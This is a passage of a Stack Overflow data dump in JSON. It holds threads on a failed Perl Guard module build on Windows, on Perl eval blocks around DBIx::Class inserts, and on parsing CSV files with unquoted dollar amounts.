Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32iop.h:16: sys\\utime.h: No such file or directory\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:6526: fcntl.h: No such file or directory\ndmake.exe:  Error code 129, while making 'Guard.o'\nFAIL\n! Installing Guard failed. See C:\\Users\\DRASKO~1.POP\\.cpanm\\work\\1\n</code></pre>\n\n<p>485557107.8988\\build.log for details. Retry with --force to force install it.</p>\n"}, {"tags": ["perl", "eval", "catalyst", "dbix-class"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 5, "creation_date": 1485542317, "post_id": 41900629, "comment_id": 70983926, "body": "<i>&quot;to either make all transactions or none if something goes wrong in the middle&quot;</i> An <code>eval</code> block won&#39;t act like a database transaction, if that&#39;s what you&#39;re hoping. Any calls to <code>insert</code> that didn&#39;t cause an exception won&#39;t be rolled back if a later one fails. Also, it looks like <code>$transactions{neuroexams}</code> should be an <i>array</i> reference rather than a hash reference."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485550227, "post_id": 41900629, "comment_id": 70987794, "body": "The problem with <code>eval { ... } or do { ... };</code> is that it may go to <code>do</code> because of the (possibly legitimate) false return from code in <code>eval</code>, what ikegami&#39;s post solves. The other way is to explicitely test for error, <code>eval { }; if ($@) { ... };</code>, in which case the return doesn&#39;t matter (it doesn&#39;t decide about it)."}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485557386, "post_id": 41900629, "comment_id": 70991036, "body": "@borodin that&#39;s very interesting because it means I understood the whole eval thing wrong. I actually took the idea from an already working chunk of code in another catalyst app at work, and it was implemented like above and the documentation regarding that implementation explicitly said the expected behaviour was to create an &quot;all or nothing&quot; sort of thing. Would it be any different if I made the transactions in a subroutine and then eval the subroutine for a change?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1485558258, "post_id": 41900629, "comment_id": 70991327, "body": "@LionelUranLandaburu: There is nothing in the great majority of languages, including Perl, that allows you to automatically rewind all that has been done since a specific point. SQL has the notion of <i>transactions</i>, which does exactly this, but only in relation to the data in a database. Clearly the actions a Perl program may take can be much further reaching, including all of the systems on the world-wide internet, and the program may consist of multiple asynchronous threads, so it cannot be done in general."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485558599, "post_id": 41900629, "comment_id": 70991431, "body": "@LionelUranLandaburu: <code>eval</code> simply catches fatal errors that would otherwise terminate the program, and gives you the chance to write code which will handle the error. If you can write code to &quot;undo&quot; the actions of the <code>eval</code> block before it failed, then it can be executed in the case of an error. But nothing will happen automatically."}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 0, "creation_date": 1485586522, "post_id": 41900629, "comment_id": 70996205, "body": "Well thanks... this is great input. As a rather new bioinformatician coming from the wet lab (with close to none background in programming), there&#39;s clearly a lot to learn and understand yet. Thank you very much for the patience :)"}, {"owner": {"reputation": 1853, "user_id": 1005136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9fa4e79e60474302c8225172649cbd35?s=128&d=identicon&r=PG", "display_name": "Alexander Hartmaier", "link": "https://stackoverflow.com/users/1005136/alexander-hartmaier"}, "edited": false, "score": 0, "creation_date": 1485588792, "post_id": 41900629, "comment_id": 70996645, "body": "The abbreviation for DBIx::Class is DBIC, DBIx is a whole namespace of DBI extensions."}], "answers": [{"comments": [{"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 0, "creation_date": 1485542158, "post_id": 41900673, "comment_id": 70983844, "body": "Thanks for the tip :) . Now, adding that &quot;1&quot; wouldn&#39;t force the eval to ignore whether or not an error occurred above?  Just tested it, and now no exceptions are thrown with the 1, but removing it will cause the exception to be thrown again. Is this safe?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 5, "creation_date": 1485542436, "post_id": 41900673, "comment_id": 70983984, "body": "It won&#39;t reach the <code>1</code> if an exception occurred earlier in the block."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1485547842, "post_id": 41900673, "comment_id": 70986635, "body": "@ikegami out of sheer curiosity, are there any benefits to doing this the <code>or do</code> way as opposed to the simple <code>if()</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 4, "creation_date": 1485548735, "post_id": 41900673, "comment_id": 70987051, "body": "@stevieb, They are equivalent."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1485563869, "post_id": 41900673, "comment_id": 70992673, "body": "@stevieb  Curious, I find <code>or do</code> to be the simplest and cleanest way. But then that&#39;s precisely why it needs that <code>1</code> .... eh"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485564845, "post_id": 41900673, "comment_id": 70992851, "body": "@zdim, No, <code>if (!eval { ... })</code> also needs the block to return true."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485564974, "post_id": 41900673, "comment_id": 70992888, "body": "@ikegami  I meant that I prefer <code>or do</code> and that I&#39;d be a happy camper if <i>that</i> didn&#39;t need it. The <code>if</code> may have it :)"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485565638, "post_id": 41900673, "comment_id": 70993012, "body": "@zdim I&#39;ve always preferred the <code>if()</code> way of doing things, as it flows better (imho). I haven&#39;t ever used <code>or do</code> before, so was asking to see whether there was a benefit to the latter from someone I&#39;ve always looked up to ;)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485565707, "post_id": 41900673, "comment_id": 70993027, "body": "@ikegami I also meant that it needs it precisely for being so clean -- it merely tests the return value for truthiness. Then the same goes for <code>if</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1485566021, "post_id": 41900673, "comment_id": 70993089, "body": "@stevieb By all means, I also cherish every word :).  Was just commenting, taste is an interesting thing.  The <code>if-else</code> part is exactly the same as <code>or</code>.  But the block after <code>if</code> is not (exactly) the same as <code>do</code>. See docs for do.  I like it and use it."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485566384, "post_id": 41900673, "comment_id": 70993143, "body": "@zdim will <code>do</code>, so to speak"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 10, "last_activity_date": 1485564934, "last_edit_date": 1485564934, "creation_date": 1485541728, "answer_id": 41900673, "question_id": 41900629, "link": "https://stackoverflow.com/questions/41900629/perl-eval-block-throwing-execptions-without-error/41900673#41900673", "title": "perl eval block throwing execptions without error", "body": "<pre><code>eval {\n  for (my $sub = 0; $sub &lt; $neuroexam_index; $sub++){\n    $transactions{neuroexams}{$sub}-&gt;insert;\n  }\n  1;  # No exception.\n}\n  or do {\n    # ... Perform rollback here ...\n    die(\"[error] Caught exception in pbitdb::Controller::Subjects-&gt;add: $@\");\n  };\n</code></pre>\n\n<p>or</p>\n\n<pre><code>if (!eval {\n  for (my $sub = 0; $sub &lt; $neuroexam_index; $sub++){\n    $transactions{neuroexams}{$sub}-&gt;insert;\n  }\n  1;  # No exception.\n}) {\n  # ... Perform rollback here ...\n  die(\"[error] Caught exception in pbitdb::Controller::Subjects-&gt;add: $@\");\n}\n</code></pre>\n\n<p>Three changes:</p>\n\n<ul>\n<li><code>1;</code> was added to ensure a true value is returned when there is no exception to ensure the RHS of the <code>or</code> isn't evaluated.</li>\n<li>The caught exception is found in <code>$@</code>, not <code>$!</code>. (<code>$!</code> maps to <code>errno</code>, the error code set by C library calls and by system calls.)</li>\n<li>Catching the exception to simply rethrow it useless. You seem to want to catch the exception to wrap the exception message, but you weren't doing so. You also mention database transactions, so I presume you want to perform a rollback on exception.</li>\n</ul>\n"}], "owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 254, "favorite_count": 0, "accepted_answer_id": 41900673, "answer_count": 1, "score": 2, "last_activity_date": 1485564934, "creation_date": 1485541544, "question_id": 41900629, "link": "https://stackoverflow.com/questions/41900629/perl-eval-block-throwing-execptions-without-error", "title": "perl eval block throwing execptions without error", "body": "<p>I'm trying to put some DBIX transactions under an <code>eval</code> block to either make all transactions or none if something goes wrong in the middle. </p>\n\n<p>I've got several transactions being done like this and none of them is giving me problems. None but one:</p>\n\n<p>The way I build the transactions is rather tricky and, for what it's worth, these actually work. I can post that chunk of code if you want, but maybe the eval block will suffice:</p>\n\n<pre><code>    eval {\n      for (my $sub = 0; $sub &lt; $neuroexam_index; $sub++){\n        $transactions{neuroexams}{$sub}-&gt;insert;\n      }\n    } or die $!;\n</code></pre>\n\n<p>The problem would be that the eval shows an error (<code>[error] Caught exception in pbitdb::Controller::Subjects-&gt;add \"Died at /home/lioneluranl/svn/pbitdb/pbitdb/script/../lib/pbitdb/Controller/Subjects.pm line 411.\"</code>) in my console, but actually performs the insertions. Why would that be?</p>\n"}, {"tags": ["python", "perl", "shell", "csv", "delimiter"], "comments": [{"owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "edited": false, "score": 3, "creation_date": 1485541751, "post_id": 41900519, "comment_id": 70983634, "body": "Your input data is broken, and you&#39;ll only be able to get band-aid solutions such as &quot;ignore first comma after dollar sign&quot; - is that good enough?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user554546"}, "edited": false, "score": 0, "creation_date": 1485542610, "post_id": 41900519, "comment_id": 70984066, "body": "Luckily the <code>prize</code> column is last, otherwise this would be even more of a pain in the ass (use the header to keep track of the number, <code>m</code>, of columns, take the columns up to the dollar sign, take columns from the right until you get <code>m-1</code> of them, then glom the remaining stuff in the middle to form the <code>prize</code> field...blech)"}, {"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 0, "creation_date": 1485545442, "post_id": 41900519, "comment_id": 70985451, "body": "@ Benjamin W - Yea, at this point I have to assume that I am going to get a broken data if not always but sometimes it may be. So bandage would be go to choice right now."}, {"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 0, "creation_date": 1485545507, "post_id": 41900519, "comment_id": 70985479, "body": "@JackManey ... Let me give it a try. Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 1, "creation_date": 1485546128, "post_id": 41900675, "comment_id": 70985762, "body": "The problem is I might be reading many csv files and each of them would have a different layout or no of fields. So it could be difficult to say if it always be at the end and how many fields I am anticipating in the file. I have to write a dynamic way to define no of fields plus I am not sure if any performance bottlenecks be present when working on large datasets"}], "tags": [], "owner": {"reputation": 28476, "user_id": 6862601, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/ppP5k.jpg?s=128&g=1", "display_name": "codeforester", "link": "https://stackoverflow.com/users/6862601/codeforester"}, "is_accepted": false, "score": 1, "last_activity_date": 1485541731, "creation_date": 1485541731, "answer_id": 41900675, "question_id": 41900519, "link": "https://stackoverflow.com/questions/41900519/processing-csv-file-without-double-quotes/41900675#41900675", "title": "Processing CSV file without double quotes", "body": "<p>If the extra <code>,</code> is always going to be a part of the last field when it exists, you could use a Bash read loop for it:</p>\n\n<pre><code>#!/bin/bash\n\nwhile IFS=, read -r f1 f2 f3 f4; do\n   # f4 =&gt; has everything after f3, including extra commas as in $4,500\n   # do your processing\n   printf \"f1=[$f1] f2=[$f2] f3=$[f3] f4=[$f4]\\n\"\ndone &lt; input.txt\n</code></pre>\n\n<p>Input:</p>\n\n<pre><code>1,xyz,1,$4,500\n2,abc,3,$400\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>f1=[1] f2=[xyz] f3=1 f4=[$4,500]\nf1=[2] f2=[abc] f3=3 f4=[$400]\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485543588, "post_id": 41900821, "comment_id": 70984556, "body": "zdim: You mentioned restrictions: Since we don&#39;t know anything about the values occuring in other fields, a trailing $, immediately followed by a comma would match too! So a minimal restriction of /(\\$\\d[\\d,]+)/ maybe, or given the case of currency to reformat: /(\\$\\d{1,3}(?:,\\d{3})+)/ ?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485543758, "post_id": 41900821, "comment_id": 70984652, "body": "@SREagle, I applied a fix."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485543897, "post_id": 41900821, "comment_id": 70984712, "body": "ikegami: What about &#39;bling$$$,100,&#39; =~ /(\\$[\\d,]*\\d)/ ? Wouldn&#39;t that still match?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485544186, "post_id": 41900821, "comment_id": 70984860, "body": "It&#39;s a heuristic, so one can always come up with a case where something will be interpreted as a price when it shouldn&#39;t. The key is finding a solution that works for the data that will actually be encountered. But yeah, <code>\\$\\d+(?:,\\d{3})*</code> is better than <code>\\$[\\d,]*\\d</code>, both because it&#39;s more restrictive, and because it performs less backtracking."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485544532, "post_id": 41900821, "comment_id": 70985029, "body": "@ikegami  Thank you very much for fixes. I am going to add now a note on the fractional amounts as well, which I completely forgot about"}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485544543, "post_id": 41900821, "comment_id": 70985033, "body": "I tend to be pedantic in these cases, having overlooked - and in turn corrupted - far to many data that needed repair that way. Better save than sorry! (And being reminded of overlooking just seconds ago by zdim&#39;s additional case :( )"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485544581, "post_id": 41900821, "comment_id": 70985055, "body": "@SREagle, I was just keeping the change minimal at first since it wasn&#39;t my answer."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485544619, "post_id": 41900821, "comment_id": 70985073, "body": "@SREagle Thank you for comments. I think that it&#39;s easy to imagine messed-up data that will throw if off here but I&#39;d first consider likely (and good) data."}, {"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 0, "creation_date": 1485549560, "post_id": 41900821, "comment_id": 70987459, "body": "@zdim Thanks . It worked perfectly. Something I was expecting. Would the regex in a similar way for address field ? I know we are referencing $ to isolate the amount field but I am wondering how this may work for address or any other field for that matter. I think that is too much to think.. I am trying to correct it at source level and have this as integrity check for amount fields. Thanks Again."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 2, "creation_date": 1485550891, "post_id": 41900821, "comment_id": 70988136, "body": "@jb04 Unless there&#39;s a set format for the address, it would be next to impossible to accurately parse. Ultimately, you&#39;re trying to solve a non-technical problem (your data provider is giving you broken data) with a technical solution, which is never a recipe for success."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 0, "creation_date": 1485553061, "post_id": 41900821, "comment_id": 70989237, "body": "@jb04 If you mean whether a regex in general can be used for it ... well, yes in principle, but addresses can come in <i>many</i> forms and there is not even the magical <code>$</code>.  It just gets harder and harder with every next variation.  If you have a strictly set format of the address, then it&#39;s easy ... if there can be no errors. Once you look for possible glitches in data it gets really tricky quick."}, {"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "edited": false, "score": 0, "creation_date": 1485553377, "post_id": 41900821, "comment_id": 70989380, "body": "@zdim My Bad, I was about to say <i>&quot;it may not work for address field&quot;</i>   Yes, I agree with you that it is harder to expand regex to counter the broken data. It is best to correct them at source or to wrap them within double quotes. I will accept yours as Answers. Thanks"}, {"owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485553528, "post_id": 41900821, "comment_id": 70989436, "body": "@ThisSuitIsBlackNot Agreed."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 9, "last_activity_date": 1485811316, "last_edit_date": 1485811316, "creation_date": 1485542283, "answer_id": 41900821, "question_id": 41900519, "link": "https://stackoverflow.com/questions/41900519/processing-csv-file-without-double-quotes/41900821#41900821", "title": "Processing CSV file without double quotes", "body": "<p>Perhaps pre-process the data to wrap all money in quotes, then process normally</p>\n\n<pre><code>$line =~ s/( \\$\\d+ (?:,\\d{3})* (?:\\.\\d{2})? )/\"$1\"/gx;\n</code></pre>\n\n<p>The pattern matches digits following a <code>$</code>, optionally followed by any multiples of <code>,nnn</code> and/or by one <code>.nn</code>. It also wraps <code>$4.22</code> as well as <code>$100</code>, which I consider good for consistency. Restrict what gets matched if needed, for example to <code>(\\$\\d{1,3},\\d{3})</code>. With fractional cents remove <code>{2}</code>. This doesn't cover all possible edge/broken cases.</p>\n\n<p>The <code>/g</code> modifier makes it replace all such in the line and <code>/x</code> allows spaces for readibilty.</p>\n\n<p>You can do it as a one-liner</p>\n\n<pre><code>perl -pe 